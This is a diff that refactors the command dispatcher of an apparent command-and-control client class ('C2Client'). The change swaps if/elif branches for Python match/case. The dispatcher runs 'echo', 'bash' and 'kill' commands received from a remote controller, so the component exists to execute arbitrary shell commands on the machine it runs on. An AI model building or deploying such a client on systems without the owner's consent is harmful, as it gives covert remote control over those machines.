@@ -135,25 +135,27 @@ class C2Client:
         success = True
 
         try:
-            if command_type == "echo":
-                result = await self.executor.execute_echo(command)
+            # Use structural pattern matching (Python 3.10+)
+            match command_type:
+                case "echo":
+                    result = await self.executor.execute_echo(command)
 
-            elif command_type == "bash":
-                # Check if command is 'cd' and handle specially
-                cmd_stripped = command.strip()
-                if cmd_stripped.startswith("cd ") or cmd_stripped == "cd":
-                    target_dir = cmd_stripped[2:].strip() if len(cmd_stripped) > 2 else ""
-                    result, success = await self.executor.execute_cd(target_dir)
-                else:
-                    result, success = await self.executor.execute_bash(command)
+                case "bash":
+                    # Check if command is 'cd' and handle specially
+                    cmd_stripped = command.strip()
+                    if cmd_stripped.startswith("cd ") or cmd_stripped == "cd":
+                        target_dir = cmd_stripped[2:].strip() if len(cmd_stripped) > 2 else ""
+                        result, success = await self.executor.execute_cd(target_dir)
+                    else:
+                        result, success = await self.executor.execute_bash(command)
 
-            elif command_type == "kill":
-                await self.execute_kill_command()
-                result = "Client terminating"
+                case "kill":
+                    await self.execute_kill_command()
+                    result = "Client terminating"
 
-            else:
-                result = f"Unknown command type: {command_type}"
-                success = False
+                case _:
+                    result = f"Unknown command type: {command_type}"
+                    success = False
 
         except Exception as e:
             logger.error(f"Error executing command {command_id}: {e}")
